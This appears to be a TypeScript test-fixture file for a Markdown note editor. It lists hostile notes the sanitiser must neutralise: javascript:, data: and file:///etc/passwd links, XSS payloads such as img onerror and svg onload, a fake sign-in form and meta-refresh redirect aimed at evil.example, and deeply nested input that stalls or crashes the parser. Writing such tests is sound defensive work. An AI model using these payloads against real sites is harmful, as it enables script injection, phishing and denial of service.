// Notes written to attack whoever reads them. The unit tests check what they
// parse to, and the browser tests (e2e/editor.browser.ts) what reaches the page.

// Links a note may not hold: no link may come of any of these.
export const UNLINKED_NOTES = [
  // Schemes that run script or open local content.
  "[x](javascript:alert(1))",
  "[x](JaVaScRiPt:alert(1))",
  "[x](<javascript:alert(1)>)",
  "[x]( javascript:alert(1))",
  "[x](<java\tscript:alert(1)>)",
  "[x](<\u0001javascript:alert(1)>)",
  "[x](<​javascript:alert(1)>)",
  "[x](< javascript:alert(1)>)",
  "[x](&#106;avascript:alert(1))",
  "[x](javascript&colon;alert(1))",
  "[x](&#x6A;&#x61;vascript&#58;alert(1))",
  "[x](data:text/html,<script>alert(1)</script>)",
  "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
  "[x](vbscript:msgbox(1))",
  "[x](file:///etc/passwd)",
  "[x](blob:https://mindgrab.app/1)",
  "<javascript:alert(1)>",
  "[x]: javascript:alert(1)\n\n[x]",
  "![x](javascript:alert(1))",
  // Schemes Tiptap's own filter lets through.
  "[x](ftp://evil.example/a)",
  "[x](tel:+3725550100)",
  "[x](sms:+3725550100)",
  // Addresses that lean on the page they are on, and so open this site or
  // another one under its name.
  "[x](//evil.example/a)",
  "[x](/api/logout.php)",
  "[x](\\\\evil.example/a)",
  "[x](evil.example/a)",
  "[x](?preferences=true)",
  "[x](#top)",
];

// Links a note may hold, and the address each opens.
export const LINKED_NOTES: [note: string, href: string][] = [
  ["[x](https://example.com/a?b=c#d)", "https://example.com/a?b=c#d"],
  ["[x](HTTP://EXAMPLE.com)", "http://example.com/"],
  // Read as the browser reads it, never against the page it is on.
  ["[x](https:example.com/a)", "https://example.com/a"],
  ["[x](mailto:a@example.com)", "mailto:a@example.com"],
  ["<https://example.com/a>", "https://example.com/a"],
  ["https://example.com/a", "https://example.com/a"],
  ["www.example.com", "http://www.example.com/"],
  [
    '[x](https://example.com/a "\\" onmouseover=\\"alert(1)")',
    "https://example.com/a",
  ],
];

// HTML written into a note. Only a browser reads it as HTML, where its text
// may stay but none of its elements, attributes or addresses.
export const HTML_NOTES = [
  '<a href="javascript:alert(1)">x</a>',
  'hello <a href="javascript:alert(1)">x</a> there',
  'hello <a href="java&#9;script:alert(1)">x</a> there',
  'hello <a href="data:text/html,<script>alert(1)</script>">x</a>',
  'hello <a href="//evil.example/a">x</a> and <a href="/api/logout.php">y</a>',
  "<img src=x onerror=alert(1)>",
  "hi <img src=https://evil.example/pixel.png onerror=alert(1)> there",
  "![x](https://evil.example/pixel.png)",
  "<script>alert(1)</script>",
  "hi <script>alert(1)</script>",
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>parent.alert(1)</script>"></iframe>',
  "<svg onload=alert(1)>",
  "<svg><script>alert(1)</script></svg>",
  "<math><mtext><script>alert(1)</script></mtext></math>",
  '<p onclick="alert(1)" style="position:fixed;inset:0" class="fixed inset-0">x</p>',
  '<h1 onclick=alert(1) class="fixed inset-0 z-50" id="root">x</h1>',
  "text <b onmouseover=alert(1)>bold</b>",
  "<details open ontoggle=alert(1)>x</details>",
  '<form action="https://evil.example"><input name=password autofocus onfocus=alert(1)><button formaction="javascript:alert(1)">Sign in</button></form>',
  "<style>*{display:none !important}</style>",
  '<link rel="stylesheet" href="https://evil.example/x.css">',
  '<base href="https://evil.example/">',
  '<meta http-equiv="refresh" content="0;url=https://evil.example">',
  '<object data="javascript:alert(1)"></object><embed src="javascript:alert(1)">',
  "<video src=x onerror=alert(1)></video><audio src=x onerror=alert(1)></audio>",
  "<body onload=alert(1)>",
  "<input onfocus=alert(1) autofocus>",
  "<marquee onstart=alert(1)>x</marquee>",
  "<template><img src=x onerror=alert(1)></template>",
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
  "<!--><img src=x onerror=alert(1)>-->",
  "<div>\n\n[x](javascript:alert(1))\n\n</div>",
  '<ul onclick=alert(1)><li data-type="taskItem" data-checked="true" onclick=alert(1)>x</li></ul>',
  '<ul data-type="taskList"><li data-type="taskItem" data-checked="\\"><img src=x onerror=alert(1)>"><p>x</p></li></ul>',
  '<ol start="1&quot; onclick=&quot;alert(1)" onclick=alert(1)><li>x</li></ol>',
  '<pre><code class="language-x fixed inset-0 z-50 bg-white" onclick=alert(1)>cover</code></pre>',
  // A fence's language became the code's class, and so any class of the app's.
  "```x fixed inset-0 z-50 bg-white\ncover\n```",
  '```"><img src=x onerror=alert(1)>\ncode\n```',
  "- [x] <img src=x onerror=alert(1)>",
  "`<script>alert(1)</script>` &lt;img src=x onerror=alert(1)&gt;",
];

// Nested past what a stack can draw, and past what one can parse. Either took
// the whole app down for whoever opened the note.
export const DEEP_NOTES = [
  `${"> ".repeat(2000)}deep`,
  `${"> ".repeat(30000)}deep`,
];

// Written to keep the Markdown reader busy: each held the page of whoever
// opened it for seconds, the first for half a minute.
export const STALLING_NOTES = [
  "*a ".repeat(20000),
  `${"> ".repeat(1500)}deep\nlast line`,
  "<b>".repeat(20000),
];
